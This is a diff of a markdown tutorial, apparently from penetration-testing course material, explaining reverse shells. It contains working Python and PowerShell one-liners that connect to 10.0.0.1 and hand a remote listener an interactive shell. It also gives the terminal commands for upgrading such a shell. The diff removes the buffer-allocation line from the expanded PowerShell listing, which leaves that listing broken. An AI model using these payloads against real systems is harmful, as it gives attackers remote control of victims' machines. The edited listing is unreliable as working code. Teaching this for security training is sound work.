@@ -46,7 +46,7 @@ Although this looks complicated, it is running a bash shell in interactive mode 
 
 At the other end, you can still use Netcat in listening mode to handle the incoming connection.
 
-There are a range of ways of running reverse shells in different languages listed on sites like PayloadsAllTheThings[\[1\]](). An example of a reverse shell written in Python is
+There are a range of ways of running reverse shells in different languages listed on sites like PayloadsAllTheThings[\[1\]](shells.md). An example of a reverse shell written in Python is
 
 ```bash
 python3 -c 'import socket,subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",6001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
@@ -74,16 +74,13 @@ The principles of reverse shells work with Windows as well but you don’t have 
 
 ```bash
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
 ```
 
-  
 When the code passed to powershell.exe's command argument \(-Command\) is expanded, it looks like this:
 
 ```python
 New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001)
 $stream = $client.GetStream()
-[byte[]]$bytes = [byte[]]::new(65536)
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
   $sendback = (iex $data 2>&1 | Out-String )
@@ -95,7 +92,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
-The script creates a socket to communicate with the attacker's listener u, creates a buffer to read v  from that socket which will be commands sent by the attacker w, executes the commands sent by the attacker x and gets the response and then writes the response back to the attacker y.
+The script creates a socket to communicate with the attacker's listener u, creates a buffer to read v from that socket which will be commands sent by the attacker w, executes the commands sent by the attacker x and gets the response and then writes the response back to the attacker y.
 
 As with all things Windows, this is slightly more complicated than the Linux versions but functional, nonetheless. Another alternative is to use a “Meterpreter” shell that is designed to work with the pentesting framework Metasploit which you will discuss shortly.
 
@@ -121,6 +118,4 @@ export SHELL=bash
 export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
-
-
 
